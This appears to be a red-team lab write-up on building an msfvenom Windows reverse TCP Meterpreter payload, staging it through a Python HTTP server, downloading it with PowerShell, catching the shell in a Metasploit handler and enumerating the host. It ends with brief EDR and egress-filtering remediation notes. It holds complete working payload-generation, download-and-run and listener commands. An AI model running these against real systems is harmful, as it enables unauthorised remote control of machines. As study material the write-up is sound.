# Remote Code Execution Payload Engineering & Shell Exploitation
**Core Focus:** Offensive Exploitation & Post-Exploitation
## Tools & Technologies:
- Metasploit Framework (msfconsole)
- msfvenom
- Python HTTP Server
- Meterpreter.
## Key Scope:
- Generated custom Windows reverse TCP payloads (msfvenom) and delivered them over Python HTTP staging servers.
- Configured multi-handler listeners in Metasploit to establish reverse shell callbacks.
- Executed post-exploitation reconnaissance (sysinfo, whoami, net user) via Meterpreter sessions.

[Metasploit] [Msfvenom] [Meterpreter] [Remote Code Execution] [Post-Exploitation]
# Executive Summary
Red team engagements require understanding payload construction, staging mechanisms, and command and control (C2) callback infrastructure. This project involved engineering a custom Windows executable payload using Metasploit, delivering it to a target host, and establishing an interactive reverse Meterpreter shell session.

Using msfvenom on Kali Linux, a reverse TCP payload (shell.exe) was constructed, hosted via a local Python HTTP server, staged onto a target Windows host, and executed. The callback was caught by a Metasploit multi-handler listener, establishing an interactive shell for post-exploitation system enumeration.
Architecture / Threat Map
sequenceDiagram

    autonumber
    participant Kali as Attacker Machine (Kali Linux - 192.168.1.100)
    participant PyServer as Python HTTP Server (Port 8080)
    participant Target as Target Host (Windows 10)
    participant Listener as Metasploit Handler (LPORT 4444)

    Note over Kali: Generate Payload via msfvenom<br/>(shell.exe - Reverse TCP)
    Kali->>PyServer: Host Payload on Port 8080
    Target->>PyServer: Download Payload via PowerShell Invoke-WebRequest
    PyServer-->>Target: Deliver shell.exe to C:\Users\Public\
    Note over Target: Execute shell.exe
    Target->>Listener: Initiate Reverse TCP Connection to 192.168.1.100:4444
    Listener-->>Target: Establish Interactive Meterpreter Session
    Note over Kali,Target: Execute Post-Exploitation (sysinfo, whoami, net user)

## Technical Execution
1. **Payload Generation with msfvenom**
- Identified attacker Kali Linux IP address: 192.168.1.100.
- Generated a Windows reverse TCP executable payload:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
2. **Payload Staging & Staged Staging Transport**
- Hosted payload using Python HTTP server on Kali Linux:
sudo python3 -m http.server 8080
- On the target Windows host, retrieved the binary via PowerShell:
Invoke-WebRequest -Uri "http://192.168.1.100:8080/shell.exe" -OutFile "C:\Users\Public\shell.exe"
3. **C2 Listener Configuration & Execution**
- Configured msfconsole multi-handler on Kali Linux:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
- Executed C:\Users\Public\shell.exe on target host.
- Post-Exploitation Commands Executed:
sysinfo: Extracted target OS details, computer name, and architecture.
getuid / whoami: Verified current user execution context.
net user: Enumerated local system user accounts.
## Remediation & Lessons Learned
- Endpoint Protection (EDR/NGAV): Standard msfvenom payloads use known stagers easily flagged by modern EDRs; endpoint execution restrictions (AppLocker / Software Restriction Policies) block execution from untrusted directories (C:\Users\Public\).
- Egress Filtering: Restricting outbound network traffic on non-standard ports (e.g., blocking outbound port 4444 at perimeter firewalls) disrupts reverse shell callbacks.
